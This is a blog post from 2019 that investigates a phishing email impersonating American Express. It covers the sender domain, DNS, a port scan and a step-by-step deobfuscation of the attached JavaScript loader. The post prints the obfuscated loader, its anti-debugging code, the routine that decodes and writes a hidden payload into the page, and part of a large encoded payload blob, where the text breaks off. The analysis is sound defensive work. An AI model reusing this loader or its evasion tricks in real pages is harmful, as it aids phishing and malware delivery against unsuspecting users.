---
title: "Obfuscated javascript, scam emails, and American Express"
date: 2019-02-02 14:49:14 -0700
header-img: "/images/amex-nmap.png"
---
Earlier today I received a scam email that managed to evade both my and gmail's email filters. I wanted to get a closer look at how it did it and what it's trying to accomplish.

The email was from "American Express" and was titled "RREMINDER: We've issue a concern".

<picture class="centered-image">
  <source srcset="/images/amex-scam-email.webp" type="image/webp">
  <source srcset="/images/amex-scam-email.png" type="image/jpeg"> 
  <img alt="Amex scam email" class="centered-image" src="/images/amex-scam-email.png">
</picture>
<p class="footnote">"American Express" Email</p>

They managed to emulate the real Amex notice email very accurately, and even knew about the way Amex generates their card numbers.

American Express card numbers always follow the format 3XXX XXXXXX XABBC[^1].

**A** = Card sequence number (starts with 1 and will increase by 1 each time a new account number is issued, usually due to theft or lost card)

**BB** = "00" for first primary card on the account. Increases by 1 for every new card on the account (01, 02, 03, etc.)

**C** = Check digit according to the <a rel="noopener" rel="noreferrer" href="https://en.wikipedia.org/wiki/Luhn_algorithm">Luhn algorithm</a>

The scammers correctly had `00` and had a 1 in 10 chance of guessing the Luhn check digit.

There were a few other mistakes, like small misspellings or grammar issues, as well as the double `R` in the subject line (`RREMINDER`) and the fact that the continue button did not link anywhere. It was decent for a spam email (it didn't break text after 80 characters) but it was far from professional.

## Domain

The first step was to look at where the email came from. The full headers are below.

```
X-Apparently-To: jonluca.decaro@yahoo.com; Sat, 02 Feb 2019 22:19:06 +0000
Return-Path: <onlineservices@member.amexmessages.com>
Received-SPF: pass (domain of member.amexmessages.com designates 63.101.151.8 as permitted sender)
X-YMailISG: <redacted-blob>
X-Originating-IP: [63.101.151.8]
Authentication-Results: mta4396.mail.ne1.yahoo.com  from=member.amexmessages.com; dkim=neutral (no sig)
Received: from 127.0.0.1  (EHLO dalexmm06.acs-inc.com) (63.101.151.8)
  by mta4396.mail.ne1.yahoo.com with SMTPS; Sat, 02 Feb 2019 22:19:04 +0000
X-IronPort-AV: E=Sophos;i="5.56,554,1539666000"; 
   d="html'217?scan'217,208,217";a="259792081"
Received: from unknown (HELO AWS12239ESMTP.local) ([63.87.170.72])
  by dalexmm06.acs-inc.com with ESMTP; 02 Feb 2019 16:18:36 -0600
From: "American Express" <onlineservices@member.amexmessages.com>
To: onlineservices@member.amexmessages.com
Subject: RREMINDER: We've issue a concern
Date: Sat, 2 Feb 2019 16:18:35 -0600
MIME-Version: 1.0
Message-ID: <15491450801506f17db7902914ccdbc1fa05e7d621_1385@member.amexmessages.com>
Content-Type: multipart/mixed; boundary="--=_Next_E459_20190124_EC12.0.12.2626"
Content-Length: 11166
```

They had registered the domain `amexmessages.com`, which is surprisingly legitimate looking. The email had a valid SPF header, and got a pass from the antivirus scanner (the `X-IronPort-AV` header).

A `whois` lookup lead to the following:

```
Domain Name: AMEXMESSAGES.COM
Registry Domain ID: 2352774515_DOMAIN_COM-VRSN
Registrar WHOIS Server: whois.PublicDomainRegistry.com
Registrar URL: http://www.publicdomainregistry.com
Updated Date: 2019-01-16T11:28:08Z
Creation Date: 2019-01-16T11:28:07Z
Registry Expiry Date: 2020-01-16T11:28:07Z
Registrar: PDR Ltd. d/b/a PublicDomainRegistry.com
Registrar IANA ID: 303
Registrar Abuse Contact Email: abuse-contact@publicdomainregistry.com
Registrar Abuse Contact Phone: +1.2013775952
Domain Status: clientTransferProhibited https://icann.org/epp#clientTransferProhibited
Name Server: MONOVM.EARTH.ORDERBOX-DNS.COM
Name Server: MONOVM.MARS.ORDERBOX-DNS.COM
Name Server: MONOVM.MERCURY.ORDERBOX-DNS.COM
Name Server: MONOVM.VENUS.ORDERBOX-DNS.COM
DNSSEC: unsigned
URL of the ICANN Whois Inaccuracy Complaint Form: https://www.icann.org/wicf/
```

The domain was registered 2 weeks ago using PublicDomainRegistry.com. A DNS query leads to where it currently resides. They prevent `ANY` queries so I had to write a short script to get all the DNS entries myself.

<picture class="centered-image">
  <source srcset="/images/amex-dns.webp" type="image/webp">
  <source srcset="/images/amex-dns.png" type="image/jpeg"> 
  <img alt="DNS of scam site" class="centered-image" src="/images/amex-dns.png">
</picture>
<p class="footnote">Preventing ANY DNS queries</p>

```bash
#!/bin/bash
query=""
# all record types
for type in {A,AAAA,ALIAS,CNAME,MX,NS,PTR,SOA,SRV,TXT,DNSKEY,DS,NSEC,NSEC3,NSEC3PARAM,RRSIG,AFSDB,ATMA,CAA,CERT,DHCID,DNAME,HINFO,ISDN,LOC,MB,MG,MINFO,MR,NAPTR,NSAP,RP,RT,TLSA,X25};
do
	query="$query $type $1" 
done
# only print resolved IPs, hostnames, and signatures
dig +noall +short +noshort +answer $query 2>/dev/null
```

I ran it on a few subdomains that I found in the email headers/DNS responses.

<picture class="centered-image">
  <source srcset="/images/amex-dns-valid.webp" type="image/webp">
  <source srcset="/images/amex-dns-valid.png" type="image/jpeg"> 
  <img alt="Amex DNS scam site" class="centered-image" src="/images/amex-dns-valid.png">
</picture>
<p class="footnote">Getting all records with any hostnames</p>

They all point to `208.91.197.90`. An nmap scan reveals that the only two ports open are 53 and 80.

<picture class="centered-image">
  <source srcset="/images/amex-nmap.webp" type="image/webp">
  <source srcset="/images/amex-nmap.png" type="image/jpeg"> 
  <img alt="Scam amex nmap" class="centered-image" src="/images/amex-nmap.png">
</picture>
<p class="footnote">Nmap scan of the domain.</p>

The IP address is registered to `CONFLUENCE-NETWORK-INC` in the British Virgin Islands. 

As of this writing there is just a default webserver running on port `80`, with one of the registrars landing pages/advertisements. 

This ended up being a dead end. Their whois information was masked, there weren't any interesting services running on their machine that were exposed, and there weren't any interesting DNS entries.

## HTML File

I didn't want to directly open up the HTML file in case there was an undiscovered 0 day in chrome/webkit so I started to poke around in Sublime Text.

The contents were very straight forward - it was completely empty besides a `script` tag.

```html
<html>
<head>
<meta http-equiv="Content-Type" content="text/html; charset=utf-8">
<script src="https://transfrmedia.com/js/html5.js">
</script>
</head>
<body>
</body>
</html>
```

The HTML loads a single javascript file from `transfrmedia.com`, which is apparently a "multidisciplinary media agency that aims to provide premium end-to-end media solutions to the event and music industries in a timely and cost effective manner". It's unknown if their service was compromised and used to host malware, whether they're a fake agency used as a front for distribution, or if they're the actual ones behind the faux email. Not relevant, but they also have a NS entry in their DNS that points to `kanye.ns.cloudflare.com`.


<picture class="centered-image">
  <source srcset="/images/trnsfrmedia.webp" type="image/webp">
  <source srcset="/images/trnsfrmedia.png" type="image/jpeg"> 
  <img alt="Scam site hosting js" class="centered-image" src="/images/trnsfrmedia.png">
</picture>
<p class="footnote">Host of the JS file</p>

The JS file, in turn, sits at a massive 3mb, and is completely obfuscated.

```js
var a = ['\x65\x6c\x50\x61\x66', 
'\x4d\x70\x4b\x73\x62',
'\x4c\x79\x66\x79\x62',
'\x57\x63\x68\x6a\x41', 
'\x61\x70\x70\x6c\x79',
...
]
```
It was time to deobfuscate it.

### Deobfuscating JS

I turned to <a rel="noopener noreferrer" href="http://jsnice.org/">JSNice</a> to do some of the initial work. It's not a particularly smart tool but it removes a lot of the manual effort like type inference, hex->text, and function inference ordering.

At this point we had something much more reasonable. Note that this will be a long file with lots of code, and we'll unpack it piece by piece.

```js
'use strict';
/** @type {!Array} */
var a = ["elPaf", "MpKsb", "Lyfyb", "WchjA", "apply", "xkowf", "function *\\( *\\)", "\\+\\+ *(?:_0x(?:[a-f0-9]){4,6}|(?:\\b|\\d)[a-z0-9]{1,4}(?:\\b|\\d))", "init", "test", "chain", "input", "<giant blob>", 
"length", "write", "string", "constructor", "while (true) {}", "counter", "SteWJ", "WlTUB", "debu", "gger", "call", "stateObject", "oHeJH"];
/**
 * @param {string} e
 * @param {?} dt
 * @return {?}
 */
var b = function(e, dt) {
  /** @type {number} */
  e = e - 0;
  var ret = a[e];
  return ret;
};
var d = function() {
  /** @type {boolean} */
  var p = !![];
  return function(value, deferred) {
    /** @type {!Function} */
    var mac = p ? function() {
      if (b("0x0") === b("0x1")) {
        debuggerProtection(0);
      } else {
        if (deferred) {
          if (b("0x2") === b("0x3")) {
            return ![];
          } else {
            var mom = deferred[b("0x4")](value, arguments);
            /** @type {null} */
            deferred = null;
            return mom;
          }
        }
      }
    } : function() {
    };
    /** @type {boolean} */
    p = ![];
    return mac;
  };
}();
(function() {
  d(this, function() {
    if (b("0x5") !== b("0x5")) {
      f("0");
    } else {
      /** @type {!RegExp} */
      var n = new RegExp(b("0x6"));
      /** @type {!RegExp} */
      var inlineAttributeCommentRegex = new RegExp(b("0x7"), "i");
      var f = c(b("0x8"));
      if (!n[b("0x9")](f + b("0xa")) || !inlineAttributeCommentRegex[b("0x9")](f + b("0xb"))) {
        f("0");
      } else {
        c();
      }
    }
  })();
})();
var i;
var t = b("0xc");
/** @type {string} */
var x = "";
/** @type {number} */
i = 0;
for (; i < t[b("0xd")]; i = i + 3) {
  /** @type {string} */
  x = x + unescape("%" + t["substr"](i, 2));
}
document[b("0xe")](x);
/**
 * @param {?} fnArgs
 * @return {?}
 */
function c(fnArgs) {
  /**
   * @param {number} i
   * @return {?}
   */
  function f(i) {
    if (typeof i === b("0xf")) {
      return function(canCreateDiscussions) {
      }[b("0x10")](b("0x11"))[b("0x4")](b("0x12"));
    } else {
      if (("" + i / i)[b("0xd")] !== 1 || i % 20 === 0) {
        if (b("0x13") === b("0x14")) {
          return function(canCreateDiscussions) {
          }[b("0x10")](b("0x11"))[b("0x4")]("counter");
        } else {
          (function() {
            return !![];
          })[b("0x10")](b("0x15") + b("0x16"))[b("0x17")]("action");
        }
      } else {
        (function() {
          return ![];
        })[b("0x10")]("debu" + b("0x16"))[b("0x4")](b("0x18"));
      }
    }
    f(++i);
  }
  try {
    if (fnArgs) {
      if ("oHeJH" !== b("0x19")) {
        x = x + unescape("%" + t["substr"](i, 2));
      } else {
        return f;
      }
    } else {
      f(0);
    }
  } catch (H) {
  }
};
```

#### a

The first declaration is an array `a`. I've omitted the full array above because the item at index 12 is a massive (>1mb) text blob, which I've replaced with `<blob>`. It will be used to reference function names, types, and variables throughout the obfuscated program. We'll rename this to `data`.

```js
var data = [
  "elPaf",
  "MpKsb",
  "Lyfyb",
  "WchjA",
  "apply",
  "xkowf",
  "function *\\( *\\)",
  "\\+\\+ *(?:_0x(?:[a-f0-9]){4,6}|(?:\\b|\\d)[a-z0-9]{1,4}(?:\\b|\\d))",
  "init",
  "test",
  "chain",
  "input",
  "<blob>",
  "length",
  "write",
  "string",
  "constructor",
  "while (true) {}",
  "counter",
  "SteWJ",
  "WlTUB",
  "debu",
  "gger",
  "call",
  "stateObject",
  "oHeJH"
];
```

#### b
Next up is `b` - it seems to be a helper function used to retrieve the contents of `data`. It has a useless parameter, `dt`, which might be a leftover from whatever obfuscation program was used to make it. We'll rename it to `retrieveDataEntry`. It is used throughout the program and invoked with hex strings, like `retrieveDataEntry("0x11")`. It takes the hex string, converts it to a number, then retrieves the contents of `data` at that index and returns it. 

```js
/**
 * @param {string} index
 * @return {?}
 */
var retrieveDataEntry = function(index) {
  /** @type {number} */
  e = e - 0;
  var ret = a[e];
  return ret;
};
```

#### c

`c` is defined later in the code, but is used in `d`, so we need to reverse it first. It first checks whether it was passed a string, and then returns a function with an arbitrary parameter that just runs infinitely. I believe this would be the `debugger` protection, although it's never named as such. If it's not passed a string, it does a length check on `i` (making sure it's a number?) and then checks if it's a multiple of 20. It does a check on two parameters from `data` to see if it should invoke the `debugger` protection, but will always fail due to the fact that `data` is static and never changed.
The function continuously calls itself, with incrementing integers. 

It then checks if it was passed function args. If it was, it ignores them, and tries to decrypt the payload. This payload will be defined below, in the <a href="#global-window-code">Global Window Code section.</a>

`c` does not seem to do much practical work besides `debug` protection.

```js
/**
 * @param {?} fnArgs
 * @return {?}
 */
function c(fnArgs) {
  /**
   * @param {number} i
   * @return {?}
   */
  function f(i) {
    if (typeof i === "string") {
      return function (canCreateDiscussions) {
      }['constructor']("while (true) {}")["apply"]("counter");
    } else {
      if (("" + i / i)["length"] !== 1 || i % 20 === 0) {
        if ("SteWJ" === "WlTUB") {
          return function (canCreateDiscussions) {
          }["constructor"]("while (true) {}")["apply"]("counter");
        } else {
          (function () {
            return true;
          })["constructor"]("debu" + "gger")["call"]("action");
        }
      } else {
        (function () {
          return false;
        })["constructor"]("debu" + "gger")["apply"]("stateObject");
      }
    }
    f(++i);
  }

  try {
    if (fnArgs) {
      if ("oHeJH" !== "oHeJH") {
        decrypted = decrypted + unescape("%" + payload["substr"](i, 2));
      } else {
        return f;
      }
    } else {
      f(0);
    }
  } catch (H) {
  }
};
```

#### d
Next up we have `d`. It's invoked immediately. It defines a variable `p` that is always true on first run, but is the first time we see an empty array literal along with a double negation to return a boolean. (As an aside, it's almost impossible to search for special characters on Google. For instance, the query `!![]; javascript` returns no results with the actual negated array. This is apparently by design by Google, which prevents certain questions from being asked at all.[^2]). Based on whether `p` is true, it returns either an empty function or a function with logic in it. 

Once the function is returned, it sets `p` to `false`. This means that the function with logic in it will only ever be returned once. For now we can rename `d` to `functionGenerator`, `p` to `isFirstRun`. 

We can also replace all the `retrieveDataEntry` calls with their values. It performs an equality check with the first two entries of the `data` array. If they are equal it'll invoke `debuggerProtection`, which isn't currently defined.

The function takes in two parameters, `value` and `deferred`. Deferred is a function and value are the properties of that function that will be `apply`'d later. We can clean up a few more variable names but now it becomes clear what it does.

```js
var functionGenerator = function () {
  /** @type {boolean} */
  var isFirstRun = true;
  return function (deferredFunctionObjectProperties, deferredFunction) {
    /** @type {!Function} */
    var funcToReturn = isFirstRun ? function () {
      if ("elPaf" === "MpKsb") {
        debuggerProtection(0);
      } else {
        if (deferredFunction) {
          if ("Lyfyb" === "WchjA") {
            return false;
          } else {
            var functionResult = deferredFunction["apply"](deferredFunctionObjectProperties, arguments);
            /** @type {null} */
            deferredFunction = null;
            return functionResult;
          }
        }
      }
    } : function () {
    };
    /** @type {boolean} */
    isFirstRun = false;
    return funcToReturn;
  };
}();
```

This is a function generator that is used to call a function at a later time, while also making sure that that function isn't being debugged. It's unclear how they plan to do the checks for if it's being debugged because, as far as we can tell so far, `data` is static and isn't changed during execution. The next bit of code invokes this function, and calls the deferred function. 

It first checks whether two items at the same index in `data` are different. We can safely remove this as it'll always return false.

The `f` and `c` calls are debug protection. 

#### Anonymous function

```js
(function () {
  functionGenerator(this, function () {
    if ("xkowf" !== "xkowf") {
      f("0");
    } else {
      /** @type {!RegExp} */
      var n = new RegExp('function *\\( *\\)');
      /** @type {!RegExp} */
      var inlineAttributeCommentRegex = new RegExp("\+\+ *(?:_0x(?:[a-f0-9]){4,6}|(?:\b|\d)[a-z0-9]{1,4}(?:\b|\d))", "i");
      var f = c("init");
      if (!n["test"](f + "chain") || !inlineAttributeCommentRegex["test"](f + "input")) {
        f("0");
      } else {
        c();
      }
    }
  })();
})();
```
#### Reversing RegEx

The function then instantiates a `RegExp` with the format:
 
`function *\\\\( *\\\\)`. 

Broken down it matches the following:

* Starts with a function and any number of spaces (`function *`)
* Matches two backslashes (`\\`)
* Starts a capture group for everything after the backslashes, until it hits two more (`( *\\)`)

These are two sample strings that match the above regex:

* `function    \\`
* `function    \\`

The capture group `$1` is always a number of spaces then \\, which is odd and not immediately clear why it was done.

It then defines another `RegExp` called `inlineAttributeCommentRegex` with the format:

`\+\+ *(?:_0x(?:[a-f0-9]){4,6}|(?:\b|\d)[a-z0-9]{1,4}(?:\b|\d))`

* Matches two + signs (`\+\+`)
* Matches any number of spaces (` *`)
* Starts a non-capture group (`(?:`)
* That matches _0x (`_0x`)
* Starts another non capture group, looking for either 4 to 6 digit hex characters (`(?:[a-f0-9]){4,6}`)
* Or another non capture group, looking for either a word boundary (\b) or a digit (\d) (`(?:\b|\d)`)
* Followed by 1 to 4 alphanumeric sequence (`[a-z0-9]{1,4}`)
* Finally matches a non capture group of either a word boundary (\b) or a digit (\d) (`(?:\b|\d)`)

These are some sample strings that match the above regex:

* `++  _0xdead`
* `++  9a9`
* `++  test9`
* `++  test` 

It seems to matching for increments to variable names. 

The function then continues on, calling `c`, with `init` as the parameter. 

It then performs a regex test against the returned value of `c`, with both the first regex with "chain" appended and the second regex with "input" appended to it. 

Based on that result it either calls `f("0")` or `c` again. `c` and `f` are debug protection, so we can safely discard this information since we are doing static analysis. This is just more wrapping against debug functions


### Debug protection

The debug protection comes in the form of adding in a `while(true){}` when it notices that it's being inspected. There are a few other articles and blog posts around explaining how to detect (and circumvent) debug protections. 

It seems like the vast majority of the code above is for debug protection. There is some logic, but we can probably discard most of it. The code might be the remnants of another program, part of the obfuscation tool used, or just convoluted to prevent inspection as we're doing now. 

### Global window code

```js
var i;
var payload = "<blob>";
/** @type {string} */
var decrypted = "";
/** @type {number} */
i = 0;
for (; i < payload['length']; i = i + 3) {
  /** @type {string} */
  decrypted = decrypted + unescape("%" + payload["substr"](i, 2));
}
document['write'](decrypted);
```

Anytime you see a reference to `document` in a script like this it's probably where the view construction and code injection actually happens.

It first instantiates 3 variables - an iterator, the payload, and the "decrypted" payload. It simply grabs the large payload, iterates over it by 3 and calls `unescape` on its contents. 

The entire `<blob>` was just URL encoded JavaScript and HTML.

The final payload is a large mix of inline scripts and HTML tags. Cleaned up (and deobfuscated again), it is as follows:

```js
'use strict';
/** @type {string} */
var OLnARWFQitgSyE = "==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